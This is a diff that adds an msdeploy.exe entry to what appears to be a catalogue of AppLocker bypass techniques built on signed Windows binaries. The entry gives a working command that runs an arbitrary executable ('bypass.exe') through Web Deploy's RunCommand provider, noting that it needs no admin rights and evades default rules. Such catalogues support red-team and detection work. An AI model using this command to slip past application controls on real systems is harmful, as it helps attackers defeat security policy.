@@ -1080,7 +1080,31 @@ Need to adjust comspec variable using: set comspec=c:\windows\system32\calc.exe
 * Links:
   * https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
   * https://twitter.com/bohops/status/980659399495741441
+    
   
   
+  
+## 57. msdeploy.exe
+
+```
+msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\bypass.exe & pause"
+```
+
+* Requires admin: No
+* Windows binary: Yes
+* Bypasses AppLocker Default rules: Yes
+
+Notes:
+Part of web deploy: 
+* https://www.iis.net/downloads/microsoft/web-deploy
+   
+* Links:
+  * https://twitter.com/pabraeken/status/999090532839313408  
+  
+  
+  
+ 
+
+
   
 
